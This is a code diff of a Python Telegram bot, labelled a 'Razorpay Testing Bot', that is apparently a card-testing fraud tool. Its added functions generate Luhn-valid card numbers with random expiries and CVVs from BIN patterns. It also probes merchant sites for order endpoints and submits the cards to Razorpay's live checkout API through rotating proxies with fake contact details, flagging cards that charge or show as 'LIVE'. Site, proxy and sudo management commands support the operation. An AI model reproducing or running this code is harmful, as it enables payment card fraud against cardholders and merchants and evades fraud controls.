-                    rj = {}
-
-                rzp_error   = rj.get("error", {})
-                error_code  = rzp_error.get("code", "")
-                error_desc  = rzp_error.get("description", body[:80])
-                next_action = rj.get("next", {})
-
-                # Determine result
-                if status in (200, 201) and "razorpay_payment_id" in body:
-                    pay_id = rj.get("razorpay_payment_id", "")
-                    return {
-                        "success":  True,
-                        "charge":   True,
-                        "response": f"Charged! payment_id={pay_id}",
-                        "code":     str(status),
-                        "timestamp": ts,
-                    }
-                elif status == 200 and next_action:
-                    # 3DS / OTP redirect — card accepted, not yet charged
-                    return {
-                        "success":  True,
-                        "charge":   False,
-                        "response": "3DS/OTP required — card accepted",
-                        "code":     "3DS",
-                        "timestamp": ts,
-                    }
-                elif "CVB" in error_code or "CVV" in error_code.upper():
-                    return {"success": False, "charge": False,
-                            "response": "CVV Mismatch", "code": error_code, "timestamp": ts}
-                elif "EXPIRED" in error_code.upper() or "expired" in error_desc.lower():
-                    return {"success": False, "charge": False,
-                            "response": "Card Expired", "code": error_code, "timestamp": ts}
-                elif "INSUFFICIENT" in error_code.upper():
-                    return {"success": True, "charge": False,
-                            "response": "Insufficient Funds (card live!)", "code": error_code, "timestamp": ts}
-                elif "BAD_REQUEST_ERROR" in error_code and status == 400:
-                    return {"success": False, "charge": False,
-                            "response": f"Bad request: {error_desc[:60]}", "code": error_code, "timestamp": ts}
-                elif status in (401, 403):
-                    return {"success": False, "charge": False,
-                            "response": "Auth error / invalid key", "code": str(status), "timestamp": ts}
-                else:
-                    return {"success": False, "charge": False,
-                            "response": error_desc[:80] or f"HTTP {status}",
-                            "code": str(status), "timestamp": ts}
-
-    except asyncio.TimeoutError:
-        return {"success": False, "charge": False,
-                "response": "Timeout", "code": "TIMEOUT", "timestamp": datetime.now().strftime("%H:%M:%S")}
-    except Exception as ex:
-        return {"success": False, "charge": False,
-                "response": str(ex)[:80], "code": "EXCEPTION",
-                "timestamp": datetime.now().strftime("%H:%M:%S")}
+    return partial + str(luhn_digit(partial))
 
 
 def validate_bin(b: str) -> Tuple[bool, Optional[str]]:
-    if not b:
-        return False, "BIN cannot be empty"
     part = b.split("|")[0].strip()
     if not all(c.isdigit() or c.lower() == "x" for c in part):
         return False, "Only digits and x allowed"
@@ -776,272 +475,435 @@ def validate_bin(b: str) -> Tuple[bool, Optional[str]]:
     return True, None
 
 
+def generate_card(pattern: str) -> Optional[str]:
+    try:
+        bp = pattern.split("|")[0].strip()
+        exp = [str(random.randint(0, 9)) if c.lower() == "x" else c for c in bp]
+        base = "".join(exp)
+        issuer = get_issuer(base)
+        if not issuer:
+            return None
+        req = CARD_ISSUERS[issuer]["length"]
+        if len(base) < req - 1:
+            base += "".join(str(random.randint(0, 9)) for _ in range(req - 1 - len(base)))
+        base = base[:req - 1]
+        pan = luhn_complete(base)
+        if not pan or len(pan) != req:
+            return None
 
-# ═══════════════════════════════════════════════════
-#              UI HELPERS
-# ═══════════════════════════════════════════════════
+        cy = datetime.now().year % 100
+        parts = pattern.split("|")
 
+        def fill(v, ln, lo, hi):
+            if not v or v.lower() in ("rnd", "rand", "random", ""):
+                return str(random.randint(lo, hi)).zfill(ln)
+            if "x" in v.lower():
+                return "".join(str(random.randint(0, 9)) if c.lower() == "x" else c for c in v)[-ln:].zfill(ln)
+            return "".join(c for c in v if c.isdigit())[-ln:].zfill(ln)
+
+        mm  = fill(parts[1] if len(parts) > 1 else None, 2, 1, 12)
+        yy  = fill(parts[2] if len(parts) > 2 else None, 2, cy + 2, cy + 8)
+        cl  = CARD_ISSUERS[issuer]["cvv"]
+        cvv = fill(parts[3] if len(parts) > 3 else None, cl, 0, 10**cl - 1)
+        return f"{pan}|{mm}|{yy}|{cvv}"
+    except Exception:
+        return None
+
+
+def gen_cards(pattern: str, count: int):
+    """Memory-efficient dedup generator."""
+    wsz = min(count, 10_000)
+    seen: Set[str] = set()
+    deq: List[str] = []
+    gen = att = 0
+    while gen < count and att < count * 15:
+        att += 1
+        c = generate_card(pattern)
+        if not c or c in seen:
+            continue
+        if len(deq) >= wsz:
+            old = deq.pop(0); seen.discard(old)
+        seen.add(c); deq.append(c)
+        gen += 1
+        yield c
+
+
+# ══════════════════════════════════════════════════
+#   RAZORPAY PAYMENT ATTEMPT
+#   Flow: 1. Try to fetch real order_id from site
+#         2. POST to Razorpay checkout with real order
+# ══════════════════════════════════════════════════
+async def fetch_order_id(site_url: str, amount_paise: int,
+                          proxy_url: Optional[str]) -> Optional[str]:
+    """
+    Attempt to create a real Razorpay order via the merchant site.
+    Many sites expose /create-order or /order/create endpoints.
+    Returns order_id string or None.
+    """
+    base = site_url.rstrip("/").rsplit("/", 1)[0]
+    candidates = [
+        f"{base}/create-order",
+        f"{base}/order/create",
+        f"{base}/razorpay/order",
+        f"{base}/payment/order",
+        f"{base}/api/order",
+        f"{base}/checkout/create-order",
+    ]
+    payload = {"amount": amount_paise, "currency": "INR"}
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        "Content-Type": "application/json",
+        "Referer": site_url,
+        "X-Requested-With": "XMLHttpRequest",
+    }
+    try:
+        conn = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(connector=conn) as s:
+            for url in candidates:
+                try:
+                    async with s.post(url, json=payload, headers=headers,
+                                      proxy=proxy_url,
+                                      timeout=aiohttp.ClientTimeout(total=8)) as r:
+                        if r.status in (200, 201):
+                            body = await r.json(content_type=None)
+                            oid = (body.get("id") or body.get("order_id") or
+                                   body.get("orderId") or
+                                   (body.get("data", {}) or {}).get("id"))
+                            if oid and str(oid).startswith("order_"):
+                                return str(oid)
+                except Exception:
+                    continue
+    except Exception:
+        pass
+    return None
+
+
+async def attempt_payment(site_url: str, rzp_key: str, card: str,
+                           amount_paise: int,
+                           proxy_url: Optional[str]) -> Dict[str, Any]:
+    parts = card.split("|")
+    if len(parts) < 4:
+        return {"success": False, "charge": False, "resp": "Bad card", "code": "ERR"}
+
+    pan, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+    ts = datetime.now().strftime("%H:%M:%S")
+
+    # Try to get a real order_id first
+    order_id = await fetch_order_id(site_url, amount_paise, proxy_url)
+    if not order_id:
+        order_id = ""  # will get BAD_REQUEST but at least no fake data leak
+
+    contact = f"+91{random.randint(7000000000, 9999999999)}"
+    email   = f"user{random.randint(10, 9999)}@gmail.com"
+
+    payload = {
+        "key_id":              rzp_key,
+        "amount":              amount_paise,
+        "currency":            "INR",
+        "order_id":            order_id,
+        "email":               email,
+        "contact":             contact,
+        "method":              "card",
+        "card[name]":          "John Doe",
+        "card[number]":        pan,
+        "card[expiry_month]":  mm,
+        "card[expiry_year]":   f"20{yy}",
+        "card[cvv]":           cvv,
+        "_":                   str(int(time.time() * 1000)),
+    }
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": site_url, "Origin": site_url,
+    }
+
+    try:
+        conn = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(connector=conn) as s:
+            async with s.post(
+                "https://api.razorpay.com/v1/payments/create/checkout",
+                data=payload, headers=headers, proxy=proxy_url,
+                timeout=aiohttp.ClientTimeout(total=22),
+                allow_redirects=False,
+            ) as r:
+                st   = r.status
+                body = await r.text(errors="replace")
+                try:
+                    rj = json.loads(body)
+                except Exception:
+                    rj = {}
+
+                err   = rj.get("error", {})
+                code  = err.get("code", "")
+                desc  = err.get("description", body[:80])
+                nxt   = rj.get("next", {})
+
+                if st in (200, 201) and "razorpay_payment_id" in body:
+                    pid = rj.get("razorpay_payment_id", "")
+                    return {"success": True, "charge": True,
+                            "resp": f"CHARGED — payment_id: {pid}", "code": str(st), "ts": ts}
+                elif st == 200 and nxt:
+                    return {"success": True, "charge": False,
+                            "resp": "3DS/OTP — card accepted", "code": "3DS", "ts": ts}
+                elif "INSUFFICIENT" in code.upper():
+                    return {"success": True, "charge": False,
+                            "resp": "Insufficient funds — card LIVE", "code": code, "ts": ts}
+                elif "EXPIRED" in code.upper() or "expired" in desc.lower():
+                    return {"success": False, "charge": False,
+                            "resp": "Card expired", "code": code, "ts": ts}
+                elif "CVV" in code.upper() or "CVB" in code:
+                    return {"success": False, "charge": False,
+                            "resp": "CVV mismatch", "code": code, "ts": ts}
+                elif st in (401, 403):
+                    return {"success": False, "charge": False,
+                            "resp": "Auth failed — key invalid or no order", "code": str(st), "ts": ts}
+                elif "BAD_REQUEST" in code and not order_id:
+                    return {"success": False, "charge": False,
+                            "resp": "No order ID — site order endpoint not found", "code": code, "ts": ts}
+                else:
+                    return {"success": False, "charge": False,
+                            "resp": desc[:80] or f"HTTP {st}", "code": str(st), "ts": ts}
+
+    except asyncio.TimeoutError:
+        return {"success": False, "charge": False, "resp": "Timeout", "code": "TIMEOUT", "ts": ts}
+    except Exception as ex:
+        return {"success": False, "charge": False, "resp": str(ex)[:80], "code": "EX", "ts": ts}
+
+
+# ══════════════════════════════════════════════════
+#   UI HELPERS  — NOTE: btn() labels use ec() not e()
+# ══════════════════════════════════════════════════
 def btn(label: str, data: str) -> InlineKeyboardButton:
     return InlineKeyboardButton(label, callback_data=data)
 
 
-def main_keyboard() -> InlineKeyboardMarkup:
+def back_btn(dest: str = "home") -> InlineKeyboardButton:
+    return btn(f"{ec('back')} Back", f"nav_{dest}")
+
+
+def home_row() -> List[InlineKeyboardButton]:
+    return [btn(f"{ec('home')} Home", "nav_home"),
+            btn(f"{ec('back')} Back", "nav_home")]
+
+
+def admin_home_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
-        [btn(f"{e('card')} Generate", "gen_help"),
-         btn(f"{e('mass')} Split",    "split_help")],
-        [btn(f"{e('stats')} Info",    "info_main"),
-         btn(f"{e('search')} Help",   "help_public")],
+        [btn(f"🔥 Test Payment", "nav_test"),
+         btn(f"🔗 Sites",        "nav_sites")],
+        [btn(f"📡 Proxies",      "nav_proxy"),
+         btn(f"🏦 BINs",         "nav_bins")],
+        [btn(f"📊 Stats",        "nav_stats"),
+         btn(f"💳 Generate",     "nav_gen")],
     ])
 
 
-def admin_keyboard() -> InlineKeyboardMarkup:
+def user_home_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
-        [btn(f"{e('fire')} Test Payment",  "menu_test"),
-         btn(f"{e('site')} Sites",         "menu_sites")],
-        [btn(f"{e('proxy')} Proxies",      "menu_proxy"),
-         btn(f"{e('bin')} BINs",           "menu_bins")],
-        [btn(f"{e('stats')} Stats",        "menu_stats"),
-         btn(f"{e('info')} Bot Info",      "info_main")],
+        [btn(f"💳 Generate", "nav_gen"),
+         btn(f"📦 Split",    "nav_split")],
+        [btn(f"📊 Stats",    "nav_stats")],
     ])
 
 
-# ═══════════════════════════════════════════════════
-#           /start
-# ═══════════════════════════════════════════════════
-
-async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    uid  = update.effective_user.id
-    auth = await is_authorized(uid)
-
-    if not auth:
+# ══════════════════════════════════════════════════
+#   /start
+# ══════════════════════════════════════════════════
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    uid = update.effective_user.id
+    if not await is_authorized(uid):
         await update.message.reply_text(
-            f"{e('lock')} <b>Restricted Bot</b>\n\n"
-            f"Contact admin for access.",
-            parse_mode=ParseMode.HTML,
-        )
+            f"{e('lock')} <b>Restricted Bot</b>\n\nContact admin for access.",
+            parse_mode=ParseMode.HTML)
         return
 
     user     = update.effective_user
     is_admin = uid == ADMIN_USER_ID
-    sites    = await redis.llen(RK_SITES)
-    proxies  = await redis.llen(RK_PROXIES)
-    bins     = await redis.llen(RK_BINS)
-    total_gen = await redis.hget(RK_STATS, "total_generated") or "0"
-    total_pay = await redis.hget(RK_STATS, "total_payments")  or "0"
-
-    role = f"{e('crown')} Owner" if is_admin else f"{e('premium')} Sudo"
+    sites  = await redis.llen(RK_SITES)
+    proxies= await redis.llen(RK_PROXIES)
+    bins   = await redis.llen(RK_BINS)
+    gen    = await redis.hget(RK_STATS, "total_generated") or "0"
+    pays   = await redis.hget(RK_STATS, "total_payments")  or "0"
+    role   = f"{e('crown')} Owner" if is_admin else f"{e('premium')} Sudo"
 
     text = (
-        f"{e('fire')} <b>Razorpay Payment Testing Bot</b> <b>v4.0</b>\n\n"
-        f"{e('wave')} Welcome, <b>{safe(user.first_name)}</b>!\n\n"
-        f"{e('stats')} <b>Live Stats</b>\n"
-        f"  {e('site')} Sites ›› <code>{sites}</code>\n"
-        f"  {e('proxy')} Proxies ›› <code>{proxies}</code>\n"
-        f"  {e('bin')} BINs ›› <code>{bins}</code>\n"
-        f"  {e('card')} Cards Gen ›› <code>{total_gen}</code>\n"
-        f"  {e('money')} Payments ›› <code>{total_pay}</code>\n\n"
+        f"{e('fire')} <b>Razorpay Testing Bot v5.0</b>\n\n"
+        f"{e('wave')} Hey <b>{safe(user.first_name)}</b>!\n\n"
+        f"{e('stats')} <b>Stats</b>\n"
+        f"  {e('site')}  Sites    ›› <code>{sites}</code>\n"
+        f"  {e('proxy')} Proxies  ›› <code>{proxies}</code>\n"
+        f"  {e('bin')}   BINs     ›› <code>{bins}</code>\n"
+        f"  {e('card')}  Generated ›› <code>{gen}</code>\n"
+        f"  {e('money')} Payments  ›› <code>{pays}</code>\n\n"
         f"{e('key')} Role: {role}\n"
-        f"{e('shield')} Redis: {e('live')} Connected"
+        f"{e('tds')} Redis: {e('live')} Online"
     )
-
-    keyboard = admin_keyboard() if is_admin else main_keyboard()
-    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
-
+    kb = admin_home_kb() if is_admin else user_home_kb()
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
 
 
-# ═══════════════════════════════════════════════════
-#        SUDO MANAGEMENT  (admin only)
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   SUDO MANAGEMENT
+# ══════════════════════════════════════════════════
 @require_auth
-async def cmd_sudo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    uid = update.effective_user.id
-    if uid != ADMIN_USER_ID:
-        await update.message.reply_text(
-            f"{e('ban')} Owner only command.", parse_mode=ParseMode.HTML)
+async def cmd_sudo(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    if update.effective_user.id != ADMIN_USER_ID:
         return
-    if not context.args:
+    if not ctx.args:
         await update.message.reply_text(
-            f"{e('error')} <b>Usage:</b> <code>/sudo &lt;user_id&gt;</code>",
-            parse_mode=ParseMode.HTML)
+            f"{e('error')} Usage: <code>/sudo user_id</code>", parse_mode=ParseMode.HTML)
         return
     try:
-        target = int(context.args[0])
-        await redis.sadd(RK_SUDO, str(target))
+        t = int(ctx.args[0])
+        await redis.sadd(RK_SUDO, str(t))
         await update.message.reply_text(
-            f"{e('check')} User <code>{target}</code> granted {e('premium')} sudo access!",
+            f"{e('check')} <code>{t}</code> granted {e('premium')} sudo.",
             parse_mode=ParseMode.HTML)
     except ValueError:
-        await update.message.reply_text(
-            f"{e('error')} Invalid user ID.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)
 
 
 @require_auth
-async def cmd_unsudo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    uid = update.effective_user.id
-    if uid != ADMIN_USER_ID:
-        await update.message.reply_text(
-            f"{e('ban')} Owner only command.", parse_mode=ParseMode.HTML)
+async def cmd_unsudo(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    if update.effective_user.id != ADMIN_USER_ID:
         return
-    if not context.args:
+    if not ctx.args:
         await update.message.reply_text(
-            f"{e('error')} <b>Usage:</b> <code>/unsudo &lt;user_id&gt;</code>",
-            parse_mode=ParseMode.HTML)
+            f"{e('error')} Usage: <code>/unsudo user_id</code>", parse_mode=ParseMode.HTML)
         return
     try:
-        target = int(context.args[0])
-        await redis.srem(RK_SUDO, str(target))
+        t = int(ctx.args[0])
+        await redis.srem(RK_SUDO, str(t))
         await update.message.reply_text(
-            f"{e('ban')} User <code>{target}</code> sudo access revoked.",
-            parse_mode=ParseMode.HTML)
+            f"{e('ban')} <code>{t}</code> revoked.", parse_mode=ParseMode.HTML)
     except ValueError:
-        await update.message.reply_text(
-            f"{e('error')} Invalid user ID.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)
 
 
 @require_auth
-async def cmd_sudolist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    uid = update.effective_user.id
-    if uid != ADMIN_USER_ID:
-        await update.message.reply_text(
-            f"{e('ban')} Owner only command.", parse_mode=ParseMode.HTML)
+async def cmd_sudolist(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    if update.effective_user.id != ADMIN_USER_ID:
         return
-    members = await redis.smembers(RK_SUDO)
-    if not members:
-        await update.message.reply_text(
-            f"{e('info')} No sudo users.", parse_mode=ParseMode.HTML)
+    m = await redis.smembers(RK_SUDO)
+    if not m:
+        await update.message.reply_text(f"{e('info')} No sudo users.", parse_mode=ParseMode.HTML)
         return
-    lines = "\n".join(f"  {e('star')} <code>{m}</code>" for m in sorted(members))
+    lines = "\n".join(f"  {e('star')} <code>{x}</code>" for x in sorted(m))
     await update.message.reply_text(
-        f"{e('crown')} <b>Sudo Users ({len(members)})</b>\n\n{lines}",
+        f"{e('crown')} <b>Sudo Users ({len(m)})</b>\n\n{lines}",
         parse_mode=ParseMode.HTML)
 
 
-# ═══════════════════════════════════════════════════
-#          SITE MANAGEMENT
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   SITE MANAGEMENT
+# ══════════════════════════════════════════════════
 @require_auth
-async def cmd_addsite(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not context.args:
+async def cmd_addsite(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    """
+    /addsite url1 url2 ...   — add specific URLs
+    Also works when you just send text with URLs in it (handled by message_handler).
+    """
+    if not ctx.args:
         await update.message.reply_text(
-            f"{e('error')} <b>Usage:</b> <code>/addsite https://example.com/pay</code>",
+            f"{e('error')} <b>Usage:</b> <code>/addsite url1 url2 …</code>\n\n"
+            f"{e('info')} You can also just paste URLs or send a <code>.txt</code> file and I'll auto-scan.",
             parse_mode=ParseMode.HTML)
         return
-    url = " ".join(context.args).strip()
-    if not url.startswith(("http://", "https://")):
-        await update.message.reply_text(
-            f"{e('error')} URL must start with <code>http://</code> or <code>https://</code>",
-            parse_mode=ParseMode.HTML)
-        return
-    existing = await redis.lrange(RK_SITES, 0, -1)
-    if url in existing:
-        await update.message.reply_text(
-            f"{e('warning')} Site already in list.", parse_mode=ParseMode.HTML)
-        return
 
-    msg = await update.message.reply_text(
-        f"{e('loading')} Checking site…", parse_mode=ParseMode.HTML)
-
-    is_live, rzp_key, status_msg = await check_site_live(url)
-    await redis.lpush(RK_SITES, url)
-    total = await redis.llen(RK_SITES)
-
-    rzp_line = f"\n{e('key')} Key: <code>{safe(rzp_key)}</code>" if rzp_key else ""
-    live_icon = e('live') if is_live else e('offline')
-
-    await msg.edit_text(
-        f"{e('check')} <b>Site Added</b>\n\n"
-        f"{e('site')} URL: <code>{safe(url)}</code>\n"
-        f"{live_icon} Status: <code>{safe(status_msg)}</code>"
-        f"{rzp_line}\n"
-        f"{e('stats')} Total sites: <code>{total}</code>",
-        parse_mode=ParseMode.HTML)
-
-
-@require_auth
-async def cmd_live(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    sites = await redis.lrange(RK_SITES, 0, -1)
-    if not sites:
-        await update.message.reply_text(
-            f"{e('error')} No sites loaded. Use <code>/addsite</code>.",
-            parse_mode=ParseMode.HTML)
-        return
-    lines = "\n".join(f"  {i}. <code>{safe(s)}</code>" for i, s in enumerate(sites, 1))
-    await update.message.reply_text(
-        f"{e('fire')} <b>Sites ({len(sites)})</b>\n\n{lines}",
-        parse_mode=ParseMode.HTML)
-
-
-@require_auth
-async def cmd_checksite(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Check all loaded sites for liveness."""
-    sites = await redis.lrange(RK_SITES, 0, -1)
-    if not sites:
-        await update.message.reply_text(
-            f"{e('error')} No sites loaded.", parse_mode=ParseMode.HTML)
-        return
+    existing = set(await redis.lrange(RK_SITES, 0, -1))
     proxies  = await redis.lrange(RK_PROXIES, 0, -1)
     proxy_url = get_random_proxy_url(proxies)
 
+    urls = [u for u in ctx.args if u.startswith(("http://", "https://"))]
+    if not urls:
+        await update.message.reply_text(
+            f"{e('error')} No valid URLs found.", parse_mode=ParseMode.HTML)
+        return
+
     msg = await update.message.reply_text(
-        f"{e('loading')} Checking {len(sites)} site(s)…", parse_mode=ParseMode.HTML)
+        f"{e('loading')} Scanning {len(urls)} URL(s)…", parse_mode=ParseMode.HTML)
 
-    results = []
-    for site in sites:
-        is_live, key, status = await check_site_live(site, proxy_url)
-        icon = e('live') if is_live else e('offline')
-        key_str = f" | {e('key')}<code>{safe(key)}</code>" if key else ""
-        results.append(f"  {icon} <code>{safe(site[:55])}</code>{key_str}\n     └ {safe(status)}")
-
-    text = f"{e('search')} <b>Site Check Results</b>\n\n" + "\n\n".join(results)
-    await msg.edit_text(text, parse_mode=ParseMode.HTML)
+    added, exists, skipped = await scan_and_store_urls(urls, proxy_url, existing)
+    total = await redis.llen(RK_SITES)
+    await msg.edit_text(
+        f"{e('check')} <b>Site Scan Complete</b>\n\n"
+        f"  {e('live')} Added (Razorpay):  <code>{added}</code>\n"
+        f"  {e('star')} Already stored:   <code>{exists}</code>\n"
+        f"  {e('offline')} Not Razorpay:    <code>{skipped}</code>\n"
+        f"  {e('stats')} Total sites:      <code>{total}</code>",
+        parse_mode=ParseMode.HTML)
 
 
 @require_auth
-async def cmd_rmsite(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def cmd_live(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     sites = await redis.lrange(RK_SITES, 0, -1)
     if not sites:
         await update.message.reply_text(
-            f"{e('error')} No sites to remove.", parse_mode=ParseMode.HTML)
+            f"{e('error')} No sites. Use /addsite or paste URLs.", parse_mode=ParseMode.HTML)
         return
-    if context.args:
+    lines = "\n".join(f"  {i}. <code>{safe(s)}</code>" for i, s in enumerate(sites, 1))
+    await update.message.reply_text(
+        f"{e('site')} <b>Sites ({len(sites)})</b>\n\n{lines}",
+        parse_mode=ParseMode.HTML)
+
+
+@require_auth
+async def cmd_checksite(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    sites = await redis.lrange(RK_SITES, 0, -1)
+    if not sites:
+        await update.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
+        return
+    proxies = await redis.lrange(RK_PROXIES, 0, -1)
+    purl = get_random_proxy_url(proxies)
+    msg = await update.message.reply_text(
+        f"{e('loading')} Checking {len(sites)} site(s)…", parse_mode=ParseMode.HTML)
+    lines, live, dead = [], 0, 0
+    for s in sites:
+        ok, k, status = await check_site_live(s, purl)
+        icon = e('live') if ok else e('offline')
+        if ok: live += 1
+        else:  dead += 1
+        ks = f"  {e('key')} <code>{safe(k)}</code>" if k else ""
+        lines.append(f"{icon} <code>{safe(s[:60])}</code>\n   └ {safe(status)}{ks}")
+    await msg.edit_text(
+        f"{e('search')} <b>Check Results</b>  {e('live')}{live} live  {e('offline')}{dead} dead\n\n"
+        + "\n\n".join(lines),
+        parse_mode=ParseMode.HTML)
+
+
+@require_auth
+async def cmd_rmsite(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    sites = await redis.lrange(RK_SITES, 0, -1)
+    if not sites:
+        await update.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
+        return
+    if ctx.args:
         try:
-            idx = int(context.args[0]) - 1
+            idx = int(ctx.args[0]) - 1
             if 0 <= idx < len(sites):
                 await redis.lrem(RK_SITES, 1, sites[idx])
                 await update.message.reply_text(
-                    f"{e('check')} Removed: <code>{safe(sites[idx])}</code>",
-                    parse_mode=ParseMode.HTML)
-            else:
-                await update.message.reply_text(
-                    f"{e('error')} Index out of range.", parse_mode=ParseMode.HTML)
+                    f"{e('check')} Removed.", parse_mode=ParseMode.HTML)
             return
         except ValueError:
             pass
-
-    keyboard = []
-    for idx, site in enumerate(sites):
-        short = (site[:45] + "…") if len(site) > 45 else site
-        keyboard.append([btn(f"🗑 {short}", f"rmsite_{idx}")])
-    keyboard.append([btn(f"{e('cross')} Cancel", "cancel")])
+    kb = [[btn(f"🗑 {(s[:42]+'…') if len(s)>42 else s}", f"rm_site_{i}")]
+          for i, s in enumerate(sites)]
+    kb.append([btn("❌ Cancel", "cancel")])
     await update.message.reply_text(
-        f"{e('tool')} <b>Select site to remove:</b>",
+        f"{e('tool')} Select site to remove:",
         parse_mode=ParseMode.HTML,
-        reply_markup=InlineKeyboardMarkup(keyboard))
+        reply_markup=InlineKeyboardMarkup(kb))
 
 
-
-# ═══════════════════════════════════════════════════
-#           PROXY MANAGEMENT
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   PROXY MANAGEMENT — test on add
+# ══════════════════════════════════════════════════
 @require_auth
-async def cmd_addpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not context.args:
+async def cmd_addpxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    if not ctx.args:
         await update.message.reply_text(
-            f"{e('error')} <b>Usage:</b> <code>/addpxy proxy1 proxy2 …</code>\n\n"
-            f"{e('proxy')} <b>Supported formats:</b>\n"
+            f"{e('proxy')} <b>Usage:</b> <code>/addpxy p1 p2 …</code>\n\n"
+            f"<b>Formats:</b>\n"
             f"  1️⃣ <code>ip:port</code>\n"
             f"  2️⃣ <code>ip:port:user:pass</code>\n"
             f"  3️⃣ <code>user:pass@ip:port</code>\n"
@@ -1050,35 +912,53 @@ async def cmd_addpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
         return
 
     existing = set(await redis.lrange(RK_PROXIES, 0, -1))
-    added = skipped = bad = 0
-    for raw in context.args:
+    msg = await update.message.reply_text(
+        f"{e('loading')} Testing {len(ctx.args)} proxy/proxies…", parse_mode=ParseMode.HTML)
+
+    results, added, bad, dupe = [], 0, 0, 0
+    for raw in ctx.args:
         info = parse_proxy(raw)
         if not info:
             bad += 1
+            results.append(f"  {e('offline')} <code>{safe(raw[:40])}</code>  — invalid format")
             continue
         if raw in existing:
-            skipped += 1
+            dupe += 1
+            results.append(f"  {e('star')} <code>{safe(raw[:40])}</code>  — duplicate (already stored)")
             continue
-        await redis.lpush(RK_PROXIES, raw)
-        existing.add(raw)
-        added += 1
+
+        ok, detail, lat = await deep_test_proxy(raw)
+        if ok:
+            await redis.lpush(RK_PROXIES, raw)
+            existing.add(raw)
+            added += 1
+            results.append(
+                f"  {e('live')} <code>{safe(raw[:40])}</code>  {lat}ms\n"
+                f"     └ {safe(detail)}")
+        else:
+            bad += 1
+            results.append(
+                f"  {e('offline')} <code>{safe(raw[:40])}</code>  DEAD\n"
+                f"     └ {safe(detail)}")
 
     total = await redis.llen(RK_PROXIES)
-    await update.message.reply_text(
-        f"{e('check')} <b>Proxies Added: {added}</b>\n"
-        f"  {e('warning')} Invalid: <code>{bad}</code>\n"
-        f"  {e('star')} Duplicate: <code>{skipped}</code>\n"
-        f"  {e('proxy')} Total: <code>{total}</code>",
-        parse_mode=ParseMode.HTML)
+    summary = (
+        f"{e('check')} <b>Proxy Add Results</b>\n\n"
+        + "\n\n".join(results)
+        + f"\n\n{e('live')} Added: <code>{added}</code>  "
+        + f"{e('offline')} Failed: <code>{bad}</code>  "
+        + f"{e('star')} Duplicate: <code>{dupe}</code>\n"
+        + f"{e('proxy')} Total stored: <code>{total}</code>"
+    )
+    await msg.edit_text(summary, parse_mode=ParseMode.HTML)
 
 
 @require_auth
-async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     proxies = await redis.lrange(RK_PROXIES, 0, -1)
     if not proxies:
         await update.message.reply_text(
-            f"{e('error')} No proxies loaded. Use <code>/addpxy</code>.",
-            parse_mode=ParseMode.HTML)
+            f"{e('error')} No proxies. Use /addpxy.", parse_mode=ParseMode.HTML)
         return
     lines = "\n".join(f"  {i}. <code>{safe(p)}</code>" for i, p in enumerate(proxies, 1))
     await update.message.reply_text(
@@ -1087,93 +967,78 @@ async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 
 @require_auth
-async def cmd_testpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Test all loaded proxies for connectivity."""
+async def cmd_testpxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     proxies = await redis.lrange(RK_PROXIES, 0, -1)
     if not proxies:
-        await update.message.reply_text(
-            f"{e('error')} No proxies loaded.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML)
         return
-
     msg = await update.message.reply_text(
-        f"{e('loading')} Testing {len(proxies)} proxies…", parse_mode=ParseMode.HTML)
-
-    results = []
-    good = bad = 0
+        f"{e('loading')} Deep-testing {len(proxies)} proxies…", parse_mode=ParseMode.HTML)
+    results, live, dead = [], 0, 0
     for raw in proxies:
-        ok, info, lat = await test_proxy(raw)
+        ok, detail, lat = await deep_test_proxy(raw)
         if ok:
-            good += 1
